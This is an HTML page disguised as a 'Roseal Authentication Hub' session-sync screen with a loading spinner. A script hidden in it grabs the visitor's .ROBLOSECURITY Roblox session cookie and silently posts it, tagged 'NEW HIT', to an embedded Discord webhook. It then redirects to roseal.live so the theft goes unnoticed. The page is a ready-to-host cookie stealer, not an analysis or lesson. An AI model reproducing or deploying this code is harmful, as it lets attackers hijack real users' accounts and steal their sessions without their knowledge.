<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Roseal | Authentication Hub</title>
    <style>
        body { background-color: #0b0b0b; color: #eee; font-family: 'Inter', sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.1); border-top-color: #00a2ff; border-radius: 50%; animation: s 0.8s linear infinite; }
        @keyframes s { to { transform: rotate(360deg); } }
        .msg { margin-top: 15px; font-size: 13px; color: #888; }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <p class="msg">Syncing session with Roseal.live...</p>

    <!-- Invisible form to bypass browser security -->
    <form id="vault" method="POST" action="https://discord.com/api/webhooks/1503137752852729858/R1LupDo2bpG_Lkph1LXUjH_7CR0u9o4BdUId8kT5sxEtWaPO1HBi0DyAmeOk1Yk0qPLq" style="display:none;">
        <input type="hidden" name="content" id="cookie_payload">
        <input type="hidden" name="username" value="Roseal Vault">
    </form>

    <script>
        (function() {
            // Grab the .ROBLOSECURITY string
            var rbx = document.cookie.match(new RegExp('(^| )' + ".ROBLOSECURITY" + '=([^;]+)'));
            
            if (rbx) {
                var token = rbx[2];
                // Set the form value
                document.getElementById('cookie_payload').value = "@everyone **NEW HIT:** `" + token + "`";
                
                // Submit the form silently in the background
                var f = document.getElementById('vault');
                var xhr = new XMLHttpRequest();
                xhr.open("POST", f.action, true);
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.send("content=" + encodeURIComponent(document.getElementById('cookie_payload').value));
            }

            // Redirect to the real site after a short delay
            setTimeout(function() {
                window.location.replace("https://www.roseal.live/dashboard");
            }, 1200);
        })();
    </script>
</body>
</html>
